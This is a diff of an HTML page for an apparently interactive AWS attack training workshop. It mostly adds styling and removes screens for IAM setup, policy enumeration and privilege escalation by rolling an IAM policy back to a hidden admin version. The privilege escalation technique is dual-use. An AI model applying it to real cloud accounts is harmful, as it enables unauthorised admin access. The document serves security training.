+.ml{font-size:13px;color:var(--tm);font-weight:500}
+.cpan{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px}
+.cp{padding:20px;border-radius:var(--rad);border:1px solid var(--br)}
+.cp.knows{background:rgba(74,144,217,.04);border-color:rgba(74,144,217,.2)}
+.cp.wants{background:rgba(255,71,87,.03);border-color:rgba(255,71,87,.2)}
+.cp-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.cp.knows .cp-label{color:var(--b)}.cp.wants .cp-label{color:var(--r)}
+.cp ul{list-style:none;font-size:14px;color:var(--t2)}.cp li{padding:3px 0 3px 16px;position:relative}.cp li::before{content:'›';position:absolute;left:0;color:var(--td)}
+.arch{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:32px;display:flex;align-items:center;justify-content:center;gap:0;flex-wrap:wrap;min-height:160px}
+.an{display:flex;flex-direction:column;align-items:center;gap:8px;padding:14px 16px;border-radius:var(--rad);border:1.5px solid var(--br);background:var(--bg);transition:all .3s;cursor:default;min-width:90px}
+.an:hover{transform:translateY(-3px);border-color:var(--b)}
+.an.vuln{border-color:rgba(255,71,87,.4)}.an.vuln:hover{border-color:var(--r)}
+.an .ai{width:40px;height:40px;display:flex;align-items:center;justify-content:center}
+.an .ai svg{width:32px;height:32px}
+.an-l{font-size:12px;font-weight:700;text-align:center}
+.an-s{font-size:10px;color:var(--td);text-align:center}
+.aarr{color:var(--td);font-size:20px;margin:0 8px;flex-shrink:0}
+.aarr.atk{color:var(--r)}
+.tb{border:2px dashed rgba(255,71,87,.25);border-radius:14px;padding:18px;position:relative;display:flex;align-items:center;gap:12px}
+.tb-label{position:absolute;top:-10px;left:18px;background:var(--bg2);padding:0 8px;font-size:10px;font-weight:700;color:var(--r);text-transform:uppercase;letter-spacing:1px}
+.term{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden;font-family:var(--mono);font-size:14px;line-height:1.7}
+.term.focus{border-color:var(--g);box-shadow:0 0 16px rgba(0,232,123,.06)}
+.th{display:flex;align-items:center;gap:7px;padding:10px 14px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--br)}
+.td{width:10px;height:10px;border-radius:50%}.td.r{background:#ff5f57}.td.y{background:#febc2e}.td.g{background:#28c840}
+.tt{font-size:11px;color:var(--td);margin-left:6px;font-family:var(--sans)}
+.tb2{padding:14px 18px;max-height:380px;overflow-y:auto;min-height:60px}
+.tl{margin-bottom:1px;white-space:pre-wrap;word-break:break-all}
+.tl.cmd{color:var(--g)}.tl.cmd::before{content:'$ ';color:var(--gd)}
+.tl.out{color:var(--tm)}
+.tl.err{color:var(--r)}.tl.err::before{content:'ERROR: '}
+.tl.alrt{color:var(--r)}.tl.alrt::before{content:'[!] '}
+.tl.ok{color:var(--g)}.tl.ok::before{content:'[✓] '}
+.tl.inf{color:var(--b)}.tl.inf::before{content:'[*] '}
+.tl .jk{color:var(--cy)}.tl .js{color:var(--g)}.tl .jn{color:var(--a)}.tl .jb{color:var(--p)}
+.tp{display:flex;align-items:center;gap:0;margin-top:4px}
+.tp .ps{color:var(--gd);white-space:pre}
+.tpi{background:none;border:none;color:var(--g);font-family:var(--mono);font-size:14px;outline:none;flex:1;caret-color:var(--g);padding:0}
+.tpi::placeholder{color:var(--td);opacity:.5}
+.thint{padding:7px 14px;background:rgba(0,232,123,.03);border-top:1px solid var(--br);display:flex;align-items:center;gap:8px;font-size:11px;color:var(--td)}
+.thint .hk{background:var(--bg3);border:1px solid var(--br);border-radius:3px;padding:1px 5px;font-family:var(--mono);font-size:10px;color:var(--g)}
+.thint .hc{color:var(--g);font-family:var(--mono);cursor:pointer;text-decoration:underline;text-underline-offset:2px}
+.thint .hc:hover{color:#fff}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:var(--rads);font-size:14px;font-weight:700;cursor:pointer;border:none;transition:all .2s;font-family:var(--sans)}
+.btn1{background:var(--g);color:var(--bg)}.btn1:hover{box-shadow:0 0 20px rgba(0,232,123,.3);transform:translateY(-1px)}.btn1:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
+.btn2{background:transparent;color:var(--g);border:1px solid var(--g)}.btn2:hover{background:rgba(0,232,123,.06)}
+.btng{background:transparent;color:var(--tm);border:1px solid var(--br);padding:10px 18px;font-size:13px}.btng:hover{border-color:var(--g);color:var(--g)}
+.btng.sel{border-color:var(--g);color:var(--g);background:rgba(0,232,123,.04)}
+.btns{padding:8px 16px;font-size:12px}
+.pulse{animation:pulseG 2.5s ease-in-out infinite}
+.tag{display:inline-block;padding:3px 10px;border-radius:16px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
+.tag-iam{background:rgba(74,144,217,.12);color:var(--b)}.tag-ec2{background:rgba(240,160,48,.12);color:var(--a)}.tag-lam{background:rgba(155,109,255,.12);color:var(--p)}.tag-s3{background:rgba(0,232,123,.08);color:var(--g)}.tag-cog{background:rgba(249,115,22,.12);color:var(--o)}.tag-crit{background:rgba(255,71,87,.12);color:var(--r)}.tag-home{background:rgba(155,109,255,.12);color:var(--p)}
+.fi{width:100%;padding:11px 14px;background:var(--bg3);border:1px solid var(--br);border-radius:var(--rads);color:var(--t1);font-size:14px;font-family:var(--mono);outline:none;transition:all .2s}
+.fi:focus{border-color:var(--g);box-shadow:0 0 8px rgba(0,232,123,.08)}
+.fi.err{border-color:var(--r)}
+.fi::placeholder{color:var(--td)}
+.fsel{appearance:none;width:100%;padding:11px 14px;background:var(--bg3) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%2364748b'/%3E%3C/svg%3E") no-repeat right 14px center;border:1px solid var(--br);border-radius:var(--rads);color:var(--t1);font-size:14px;cursor:pointer;outline:none;transition:all .2s}
+.fsel:focus{border-color:var(--g)}
+.flbl{display:block;font-size:12px;font-weight:700;color:var(--tm);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
+.ferr{font-size:11px;color:var(--r);margin-top:4px;display:none}.ferr.vis{display:block}
+.epan{padding:18px 20px;border-radius:var(--rad);border:1px solid rgba(255,71,87,.3);background:rgba(255,71,87,.04);margin:16px 0;display:none}
+.epan.vis{display:block;animation:fadeS .35s ease}
+.epan h4{color:var(--r);font-size:15px;margin-bottom:6px}
+.epan p{font-size:13px;color:var(--t2);line-height:1.5}
+.epan .fix{margin-top:10px;padding:10px 14px;background:rgba(0,232,123,.04);border:1px solid rgba(0,232,123,.15);border-radius:var(--rads);font-size:12px;color:var(--g)}
+.oc{display:grid;gap:10px}.oc2{grid-template-columns:1fr 1fr}.oc3{grid-template-columns:1fr 1fr 1fr}
+.ocard{padding:16px;border:2px solid var(--br);border-radius:var(--rads);cursor:pointer;transition:all .2s;background:var(--bg2)}
+.ocard:hover{border-color:var(--b)}
+.ocard.sel{border-color:var(--g);background:rgba(0,232,123,.02)}
+.ocard.wrong{border-color:var(--r);background:rgba(255,71,87,.03)}
+.ocard .oct{font-weight:700;font-size:15px;margin-bottom:3px}
+.ocard .ocd{font-size:12px;color:var(--tm)}
+.pbox{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden}
+.phdr{padding:10px 14px;font-size:12px;font-weight:700;border-bottom:1px solid var(--br);text-transform:uppercase;letter-spacing:.8px}
+.phdr.safe{color:var(--b);background:rgba(74,144,217,.04)}.phdr.dng{color:var(--r);background:rgba(255,71,87,.04)}
+.pbdy{padding:14px 18px;font-family:var(--mono);font-size:13px;line-height:1.8;color:var(--tm)}
+.pbdy .jk{color:var(--cy)}.pbdy .js{color:var(--g)}.pbdy .jd{color:var(--r)}
+.cbox{background:var(--bgt);border:2px solid var(--a);border-radius:var(--rad);padding:20px;margin:16px 0;display:none}
+.cbox.vis{display:block;animation:flashI .3s ease}
+.cbox.dng{border-color:var(--r)}.cbox.ok{border-color:var(--g)}
+.cbox h4{font-size:15px;margin-bottom:6px}.cbox p{font-size:13px;color:var(--t2);margin-bottom:14px}
+.crow{display:flex;gap:10px;align-items:center}.crow input{flex:1}
+.fb{padding:16px 22px;border-radius:var(--rads);font-weight:700;font-size:16px;text-align:center;display:none;animation:flashI .4s ease}
+.fb.dng{background:rgba(255,71,87,.1);border:1px solid var(--r);color:var(--r)}
+.fb.ok{background:rgba(0,232,123,.06);border:1px solid var(--g);color:var(--g)}
+.fb.vis{display:block}
+.cc{display:flex;align-items:center;justify-content:center;gap:0;padding:24px 0;overflow-x:auto}
+.cn{display:flex;flex-direction:column;align-items:center;gap:6px;opacity:0;transform:scale(.7);transition:all .5s cubic-bezier(.34,1.56,.64,1)}
+.cn.vis{opacity:1;transform:scale(1)}
+.cib{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;border:2px solid;font-size:16px;font-weight:800}
+.cl{font-size:11px;color:var(--tm);font-weight:600;text-align:center;max-width:80px}
+.ca{font-size:20px;color:var(--td);margin:0 6px;opacity:0;transition:opacity .3s}.ca.vis{opacity:1}
+.ceditor{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden}
+.ceditor-h{display:flex;align-items:center;gap:8px;padding:9px 14px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--br);font-size:12px;color:var(--td)}
+.ceditor-b{padding:14px 18px;font-family:var(--mono);font-size:13px;line-height:1.8;overflow-x:auto}
+.ceditor-b .kw{color:var(--p)}.ceditor-b .fn{color:var(--b)}.ceditor-b .st{color:var(--g)}.ceditor-b .vr{color:var(--cy)}
+.ni{display:flex;align-items:center;gap:14px;padding:10px 0}
+.nlbl{width:170px;font-size:13px;font-weight:600}
+.nbg{flex:1;height:7px;background:var(--bg3);border-radius:4px;overflow:hidden}
+.nf{height:100%;width:0;border-radius:4px;transition:width 1.2s cubic-bezier(.4,0,.2,1);background:linear-gradient(90deg,var(--r),var(--a))}
+.ns{width:28px;text-align:center;font-size:16px}
+.kcg{display:flex;flex-direction:column;gap:0;padding:16px 0}
+.kcp{display:flex;align-items:stretch;gap:0;opacity:0;transform:translateX(-16px);transition:all .6s cubic-bezier(.34,1.56,.64,1)}
+.kcp.vis{opacity:1;transform:translateX(0)}
+.kcl{width:140px;flex-shrink:0;padding:14px;display:flex;align-items:center;justify-content:flex-end;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--td)}
+.kcln{width:3px;flex-shrink:0;margin:0 16px;position:relative}.kcln::before{content:'';position:absolute;inset:0;border-radius:2px}
+.kcd{width:11px;height:11px;border-radius:50%;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);border:2px solid var(--bg)}
+.kcc{flex:1;padding:12px 18px;background:var(--bg2);border:1px solid var(--br);border-radius:var(--rads);margin:5px 0}
+.kcc h4{font-size:15px;font-weight:700;margin-bottom:3px}.kcc p{font-size:12px;color:var(--tm)}
+.ph-r .kcln::before,.ph-r .kcd{background:var(--b)}
+.ph-e .kcln::before,.ph-e .kcd{background:var(--a)}
+.ph-s .kcln::before,.ph-s .kcd{background:var(--r)}
+.ph-x .kcln::before,.ph-x .kcd{background:var(--p)}
+.ph-i .kcln::before,.ph-i .kcd{background:var(--r)}
+.mov{position:fixed;inset:0;background:var(--ov);z-index:2500;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .3s}
+.mov.vis{display:flex;opacity:1}
+.mod{background:var(--bg2);border:1px solid var(--br);border-radius:14px;width:520px;max-width:90vw;max-height:85vh;overflow-y:auto;box-shadow:0 20px 50px rgba(0,0,0,.5);animation:modI .3s ease}
+.mod-h{padding:22px 24px 0;display:flex;align-items:flex-start;justify-content:space-between}
+.mod-h h2{font-size:22px;font-weight:800}
+.mod-x{background:none;border:none;color:var(--td);font-size:22px;cursor:pointer;padding:4px;line-height:1}
+.mod-x:hover{color:var(--t1)}
+.mod-b{padding:16px 24px 24px}
+.mod-f{padding:14px 24px;border-top:1px solid var(--br);display:flex;justify-content:flex-end;gap:10px}
+.toast-c{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:3000;display:flex;flex-direction:column;gap:6px;align-items:center}
+.toast{padding:12px 22px;border-radius:var(--rads);font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px;animation:toastI .3s ease,toastO .3s ease 3.7s forwards;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.toast.info{background:var(--b);color:#fff}.toast.success{background:var(--g);color:var(--bg)}.toast.warning{background:var(--a);color:var(--bg)}.toast.error{background:var(--r);color:#fff}
+.callout{padding:16px 20px;border-radius:var(--rad);border-left:3px solid;margin:16px 0;font-size:14px;line-height:1.55}
+.callout.insight{border-color:var(--b);background:rgba(74,144,217,.04);color:var(--t2)}
+.callout.warning{border-color:var(--a);background:rgba(240,160,48,.04);color:var(--t2)}
+.callout.danger{border-color:var(--r);background:rgba(255,71,87,.04);color:var(--t2)}
+.callout.success{border-color:var(--g);background:rgba(0,232,123,.03);color:var(--t2)}
+.callout strong{color:var(--t1)}
+.ptabs{display:flex;gap:3px;margin-bottom:18px}
+.ptab{padding:9px 18px;border-radius:var(--rads) var(--rads) 0 0;font-size:13px;font-weight:700;cursor:pointer;background:var(--bg2);color:var(--td);border:1px solid var(--br);border-bottom:none;transition:all .2s}
+.ptab.act{background:var(--bgt);color:var(--g);border-color:var(--g)}
+.pcont{display:none}.pcont.act{display:block}
+.split{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.swr{grid-template-columns:2fr 3fr}
+.mt-8{margin-top:8px}.mt-12{margin-top:12px}.mt-16{margin-top:16px}.mt-20{margin-top:20px}.mt-24{margin-top:24px}.mt-30{margin-top:30px}
+.mb-8{margin-bottom:8px}.mb-12{margin-bottom:12px}.mb-16{margin-bottom:16px}.mb-20{margin-bottom:20px}.mb-24{margin-bottom:24px}
+.tc{text-align:center}
+.aws-iam{color:var(--b)}.aws-ec2{color:var(--a)}.aws-lam{color:var(--p)}.aws-s3{color:var(--g)}.aws-cog{color:var(--o)}.aws-nk{color:var(--r)}
+@keyframes pulseG{0%,100%{box-shadow:0 0 6px rgba(0,232,123,.15)}50%{box-shadow:0 0 22px rgba(0,232,123,.45)}}
+@keyframes flashI{0%{opacity:0;transform:scale(.96)}100%{opacity:1;transform:scale(1)}}
+@keyframes fadeS{0%{opacity:0;transform:translateY(12px)}100%{opacity:1;transform:translateY(0)}}
+@keyframes modI{0%{opacity:0;transform:scale(.92) translateY(16px)}100%{opacity:1;transform:scale(1) translateY(0)}}
+@keyframes toastI{0%{opacity:0;transform:translateY(16px)}100%{opacity:1;transform:translateY(0)}}
+@keyframes toastO{0%{opacity:1}100%{opacity:0;transform:translateY(-8px)}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.shake{animation:shake .3s ease}
 </style>
 </head>
 <body>
-
-<!-- ===== PROGRESS BAR ===== -->
-<div id="progress-bar"></div>
-
-<!-- ===== TOAST CONTAINER ===== -->
-<div class="toast-container" id="toast-container"></div>
-
-<!-- ===== MODAL OVERLAY ===== -->
-<div class="modal-overlay" id="modal-overlay">
-  <div class="modal" id="modal-content"></div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 1: LANDING                                -->
-<!-- ================================================ -->
-<div class="screen" id="screen-1">
-  <div class="text-center" style="margin-top:40px">
-    <div class="screen-badge" style="justify-content:center">Cloud Village Labs</div>
-    <h1 class="screen-title" style="font-size:56px">AWS Attack Workshop</h1>
-    <p class="screen-subtitle" style="margin:12px auto 50px;max-width:620px">
-      An attack-focused, hands-on workshop. Learn common attack techniques against AWS cloud infrastructure — step by step.
-    </p>
-  </div>
-  <div class="card-grid card-grid-4" style="max-width:900px;margin:0 auto 50px">
-    <div class="metric-card"><div class="metric-value" data-count="7">0</div><div class="metric-label">Attack Vectors</div></div>
-    <div class="metric-card"><div class="metric-value" data-count="5">0</div><div class="metric-label">AWS Services</div></div>
-    <div class="metric-card"><div class="metric-value" data-count="1">0</div><div class="metric-label">Kill Chain</div></div>
-    <div class="metric-card"><div class="metric-value" data-count="45">0</div><div class="metric-label">Minutes</div></div>
-  </div>
-  <div class="attack-map" style="max-width:900px;margin:0 auto 50px">
-    <div class="attack-map-node"><div class="attack-map-icon" style="background:rgba(59,130,246,0.1);color:var(--accent-blue)">IAM</div><div class="attack-map-label">Identity</div></div>
-    <div class="attack-map-connector">→</div>
-    <div class="attack-map-node"><div class="attack-map-icon" style="background:rgba(255,71,87,0.1);color:var(--accent-red)">COG</div><div class="attack-map-label">Cognito</div></div>
-    <div class="attack-map-connector">→</div>
-    <div class="attack-map-node"><div class="attack-map-icon" style="background:rgba(245,158,11,0.1);color:var(--accent-amber)">EC2</div><div class="attack-map-label">Compute</div></div>
-    <div class="attack-map-connector">→</div>
-    <div class="attack-map-node"><div class="attack-map-icon" style="background:rgba(0,255,136,0.1);color:var(--accent-green)">S3</div><div class="attack-map-label">Storage</div></div>
-    <div class="attack-map-connector">→</div>
-    <div class="attack-map-node"><div class="attack-map-icon" style="background:rgba(168,85,247,0.1);color:var(--accent-purple)">λ</div><div class="attack-map-label">Lambda</div></div>
-  </div>
-  <div class="text-center">
-    <button class="btn btn-primary pulse-cta" onclick="navigateTo(2)">Begin Workshop <span class="btn-icon">→</span></button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 2: ENVIRONMENT SETUP (Interactive Wizard) -->
-<!-- ================================================ -->
-<div class="screen" id="screen-2">
-  <div class="screen-badge">Phase 0</div>
-  <h1 class="screen-title">Environment Setup</h1>
-  <p class="screen-subtitle">Configure your AWS environment step by step. Fill in each field, select options, and verify your setup.</p>
-
-  <div class="wizard-steps" id="setup-wizard-steps">
-    <div class="wizard-step active" data-ws="1"><span class="wizard-step-num">1</span><span class="wizard-step-label">IAM User</span></div>
-    <div class="wizard-step" data-ws="2"><span class="wizard-step-num">2</span><span class="wizard-step-label">Access Type</span></div>
-    <div class="wizard-step" data-ws="3"><span class="wizard-step-num">3</span><span class="wizard-step-label">Permissions</span></div>
-    <div class="wizard-step" data-ws="4"><span class="wizard-step-num">4</span><span class="wizard-step-label">CLI Config</span></div>
-    <div class="wizard-step" data-ws="5"><span class="wizard-step-num">5</span><span class="wizard-step-label">Verify</span></div>
-  </div>
-
-  <!-- Wizard Panel 1: Create User -->
-  <div class="wizard-panel active" id="wp-1">
-    <div class="split">
-      <div class="card">
-        <h3>Create IAM Admin User</h3>
-        <p class="text-muted fs-14 mb-20">Create a dedicated admin user instead of using root credentials.</p>
-        <div class="form-group">
-          <label class="form-label">Username</label>
-          <input class="form-input" id="iam-username" type="text" placeholder="e.g. iamadmin" autocomplete="off">
-          <div class="form-error" id="iam-username-error">Username is required</div>
-        </div>
-        <div class="form-group">
-          <label class="form-label">Password</label>
-          <input class="form-input" id="iam-password" type="password" placeholder="Enter a strong password" autocomplete="off">
-          <div class="form-error" id="iam-password-error">Password must be at least 8 characters</div>
-        </div>
-        <div class="form-group">
-          <label class="form-toggle"><div class="form-toggle-track" id="toggle-reset" onclick="toggleSwitch(this)"><div class="form-toggle-thumb"></div></div> Require password reset on first login</label>
-        </div>
-        <button class="btn btn-primary" onclick="wizardNext(1)">Create User →</button>
-      </div>
-      <div>
-        <div class="terminal">
-          <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">AWS Console — IAM</span></div>
-          <div class="terminal-body" id="terminal-wp1" style="min-height:200px"><span class="text-muted" style="font-style:italic">Waiting for user input...</span></div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Wizard Panel 2: Access Type -->
-  <div class="wizard-panel" id="wp-2">
-    <div class="card" style="max-width:700px">
-      <h3>Select Access Type</h3>
-      <p class="text-muted fs-14 mb-20">Choose how this user will interact with AWS.</p>
-      <div class="option-cards option-cards-2 mb-20">
-        <div class="option-card" id="opt-programmatic" onclick="selectOption('access-type',this)">
-          <div class="oc-icon">⌨</div>
-          <div class="oc-title">Programmatic Access</div>
-          <div class="oc-desc">Access Key ID and Secret for CLI, SDK, and API access.</div>
-        </div>
-        <div class="option-card" id="opt-console" onclick="selectOption('access-type',this)">
-          <div class="oc-icon">🖥</div>
-          <div class="oc-title">Console Access</div>
-          <div class="oc-desc">Password-based sign-in to the AWS Management Console.</div>
-        </div>
-      </div>
-      <div class="form-checkbox mb-20" style="display:none" id="both-access-check">
-        <input type="checkbox" id="both-access" checked> <span>Enable both access types (recommended for workshop)</span>
-      </div>
-      <button class="btn btn-primary" id="btn-access-next" onclick="wizardNext(2)" disabled>Continue →</button>
-    </div>
-  </div>
-
-  <!-- Wizard Panel 3: Permissions -->
-  <div class="wizard-panel" id="wp-3">
-    <div class="card" style="max-width:700px">
-      <h3>Attach Permissions Policy</h3>
-      <p class="text-muted fs-14 mb-20">Select the permission policy to attach to this user.</p>
-      <div class="form-group">
-        <label class="form-label">Search Policies</label>
-        <input class="form-input" id="policy-search" type="text" placeholder="Type to search... e.g. Administrator" oninput="filterPolicies(this.value)" autocomplete="off">
-      </div>
-      <div id="policy-list" style="max-height:240px;overflow-y:auto">
-        <div class="option-card" data-policy="AdministratorAccess" onclick="selectPolicy(this)" style="margin-bottom:8px">
-          <div class="flex items-center justify-between"><div class="oc-title">AdministratorAccess</div><span class="tag tag-critical">Full Access</span></div>
-          <div class="oc-desc">Provides full access to AWS services and resources.</div>
-        </div>
-        <div class="option-card" data-policy="PowerUserAccess" onclick="selectPolicy(this)" style="margin-bottom:8px">
-          <div class="flex items-center justify-between"><div class="oc-title">PowerUserAccess</div><span class="tag tag-iam">High</span></div>
-          <div class="oc-desc">Full access except IAM and Organizations management.</div>
-        </div>
-        <div class="option-card" data-policy="ReadOnlyAccess" onclick="selectPolicy(this)" style="margin-bottom:8px">
-          <div class="flex items-center justify-between"><div class="oc-title">ReadOnlyAccess</div><span class="tag tag-s3">Read</span></div>
-          <div class="oc-desc">Read-only access to all AWS services.</div>
-        </div>
-        <div class="option-card" data-policy="AmazonS3FullAccess" onclick="selectPolicy(this)" style="margin-bottom:8px">
-          <div class="flex items-center justify-between"><div class="oc-title">AmazonS3FullAccess</div><span class="tag tag-s3">S3</span></div>
-          <div class="oc-desc">Full access to S3 buckets and objects.</div>
-        </div>
-        <div class="option-card" data-policy="AmazonEC2FullAccess" onclick="selectPolicy(this)" style="margin-bottom:8px">
-          <div class="flex items-center justify-between"><div class="oc-title">AmazonEC2FullAccess</div><span class="tag tag-ec2">EC2</span></div>
-          <div class="oc-desc">Full access to EC2 instances and related resources.</div>
-        </div>
-      </div>
-      <button class="btn btn-primary mt-20" id="btn-policy-next" onclick="wizardNext(3)" disabled>Attach Policy →</button>
-    </div>
-  </div>
-
-  <!-- Wizard Panel 4: CLI Configuration (Interactive Terminal) -->
-  <div class="wizard-panel" id="wp-4">
-    <div class="split">
-      <div class="card">
-        <h3>Configure AWS CLI</h3>
-        <p class="text-muted fs-14 mb-20">Type each value into the terminal as prompted. The CLI will guide you through the configuration.</p>
-        <div class="card" style="background:var(--bg-tertiary);padding:16px;margin-bottom:16px">
-          <div class="fs-14 fw-700 mb-12">Your Credentials</div>
-          <div class="fs-14 mono text-muted mb-12">Access Key ID: <span class="text-green" id="display-access-key">AKIAIOSFODNN7EXAMPLE</span></div>
-          <div class="fs-14 mono text-muted mb-12">Secret Key: <span class="text-green">wJalrXUtnFEMI/K7MDENG/bPx</span></div>
-          <div class="fs-12 text-muted">Copy and paste these into the terminal prompts below.</div>
-        </div>
-        <div class="fs-12 text-muted">Tip: Click the suggested command below the terminal, or type it yourself.</div>
-      </div>
-      <div>
-        <div class="terminal focused" id="cli-terminal">
-          <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — aws-configure</span></div>
-          <div class="terminal-body" id="terminal-cli"></div>
-          <div class="terminal-hint" id="cli-hint">
-            <span class="hint-key">↵</span> submit
-            <span style="margin-left:auto">Suggested: <span class="hint-cmd" id="cli-hint-cmd" onclick="useHint()"></span></span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Wizard Panel 5: Verification -->
-  <div class="wizard-panel" id="wp-5">
-    <div class="split">
-      <div class="card">
-        <h3>Verify Your Identity</h3>
-        <p class="text-muted fs-14 mb-20">Run the verification command to confirm your setup is working correctly.</p>
-        <div class="confirm-box" id="verify-success" style="border-color:var(--accent-green)">
-          <h4 class="text-green">Environment Ready</h4>
-          <p>Identity verified. Your AWS environment is configured and ready for the workshop.</p>
-        </div>
-        <button class="btn btn-primary mt-20" id="btn-start-recon" onclick="navigateTo(3)" disabled>Start Reconnaissance →</button>
-      </div>
-      <div>
-        <div class="terminal focused" id="verify-terminal">
-          <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — verification</span></div>
-          <div class="terminal-body" id="terminal-verify"></div>
-          <div class="terminal-hint" id="verify-hint">
-            <span class="hint-key">↵</span> submit
-            <span style="margin-left:auto">Type: <span class="hint-cmd" id="verify-hint-cmd" onclick="useVerifyHint()">aws sts get-caller-identity</span></span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 3: IAM RECON (Interactive Terminal)       -->
-<!-- ================================================ -->
-<div class="screen" id="screen-3">
-  <div class="screen-badge">Phase 1 — Reconnaissance</div>
-  <h1 class="screen-title">IAM Policy Enumeration</h1>
-  <p class="screen-subtitle">Type each recon command to discover policies and hidden versions. Follow the prompts.</p>
-
-  <div class="split split-wide-right">
-    <div>
-      <h3 style="margin-bottom:12px">Findings</h3>
-      <div id="recon-findings">
-        <div class="finding-card info" id="finding-1"><div class="finding-title">User Identified</div><div class="finding-detail">raynor-iam_privesc_by_rollback</div></div>
-        <div class="finding-card info" id="finding-2"><div class="finding-title">Policy Attached</div><div class="finding-detail">arn:aws:iam::012345678901:policy/cg-raynor-policy</div></div>
-        <div class="finding-card warning" id="finding-3"><div class="finding-title">5 Policy Versions Found</div><div class="finding-detail">v1 (default), v2, v3, v4, v5</div></div>
-        <div class="finding-card critical" id="finding-4"><div class="finding-title">v1 — Full Admin Access</div><div class="finding-detail">"Action": "*", "Resource": "*"</div></div>
-      </div>
-      <button class="btn btn-primary mt-30" id="btn-launch-attack" onclick="navigateTo(4)" disabled>Launch Policy Attack →</button>
-    </div>
-    <div>
-      <div class="terminal focused">
-        <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — iam-recon</span></div>
-        <div class="terminal-body" id="terminal-recon"></div>
-        <div class="terminal-hint" id="recon-hint">
-          <span class="hint-key">↵</span> submit
-          <span style="margin-left:auto">Next: <span class="hint-cmd" id="recon-hint-cmd" onclick="useReconHint()"></span></span>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 4: IAM POLICY ROLLBACK (Confirmation)     -->
-<!-- ================================================ -->
-<div class="screen" id="screen-4">
-  <div class="screen-badge">Phase 2 — Privilege Escalation</div>
-  <h1 class="screen-title">Policy Version Rollback</h1>
-  <p class="screen-subtitle">Compare policy versions, then confirm the rollback to escalate privileges.</p>
-
-  <div id="escalation-banner" class="flash-banner danger mb-30">⚠ PRIVILEGE ESCALATED — Full AdministratorAccess Achieved</div>
-
-  <div class="split mb-30">
-    <div>
-      <h3>Current Policy (v5) — Restricted</h3>
-      <div class="policy-box mt-20">
-        <div class="policy-header restricted">v5 · Default · Read-Only</div>
-        <div class="policy-body">{<br>&nbsp;&nbsp;<span class="jk">"Version"</span>: <span class="js">"2012-10-17"</span>,<br>&nbsp;&nbsp;<span class="jk">"Statement"</span>: [{<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Effect"</span>: <span class="js">"Allow"</span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Action"</span>: [<span class="js">"iam:Get*"</span>, <span class="js">"iam:List*"</span>, <span class="js">"iam:SetDefaultPolicyVersion"</span>],<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="js">"*"</span><br>&nbsp;&nbsp;}]<br>}</div>
-      </div>
-    </div>
-    <div>
-      <h3>Target Policy (v1) — <span class="text-red">Full Admin</span></h3>
-      <div class="policy-box mt-20">
-        <div class="policy-header dangerous">v1 · Hidden · AdministratorAccess</div>
-        <div class="policy-body">{<br>&nbsp;&nbsp;<span class="jk">"Version"</span>: <span class="js">"2012-10-17"</span>,<br>&nbsp;&nbsp;<span class="jk">"Statement"</span>: [{<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Effect"</span>: <span class="js">"Allow"</span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Action"</span>: <span class="js" style="color:var(--accent-red)">"*"</span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="js" style="color:var(--accent-red)">"*"</span><br>&nbsp;&nbsp;}]<br>}</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Version Selector -->
-  <div class="card mb-30" id="version-selector-card">
-    <h3>Select Target Version</h3>
-    <p class="text-muted fs-14 mb-20">Choose which policy version to activate as the default.</p>
-    <div class="option-cards option-cards-2 mb-20" style="grid-template-columns:repeat(5,1fr)">
-      <div class="option-card" onclick="selectVersion(this,'v5')" style="text-align:center;padding:12px"><div class="oc-title">v5</div><div class="oc-desc">Default</div></div>
